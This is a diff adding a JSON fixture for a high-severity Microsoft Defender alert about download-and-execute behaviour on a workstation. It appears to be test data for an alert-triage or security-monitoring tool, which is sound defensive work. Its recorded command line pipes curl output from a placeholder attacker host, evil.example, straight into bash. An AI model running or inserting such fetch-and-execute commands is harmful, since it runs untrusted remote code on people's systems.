@@ -1,0 +1,25 @@
+{
+  "platform": "microsoft_defender",
+  "alert_type": "suspicious_process",
+  "severity": "high",
+  "description": "Suspicious command-line execution detected: curl piped to bash, consistent with download-and-execute behavior.",
+  "observables": {
+    "source_ip": "10.0.2.88",
+    "hostname": "WORKSTATION-42",
+    "username": "jsmith",
+    "process_name": "bash",
+    "url": "http://evil.example/payload.sh",
+    "file_hash": "a1b2c3d4e5f6789012345678abcdef9012345678abcdef9012345678abcdef90"
+  },
+  "raw_event": {
+    "alertId": "da-7f3a-9c21-b4e8-001",
+    "title": "Suspicious script execution via curl and bash",
+    "severity": "High",
+    "category": "Execution",
+    "timestamp": "2026-07-07T09:15:33Z",
+    "deviceName": "WORKSTATION-42",
+    "accountName": "CORP\\jsmith",
+    "processCommandLine": "bash -c \"curl -s http://evil.example/payload.sh | bash\"",
+    "initiatingProcessFileName": "bash.exe"
+  }
+}
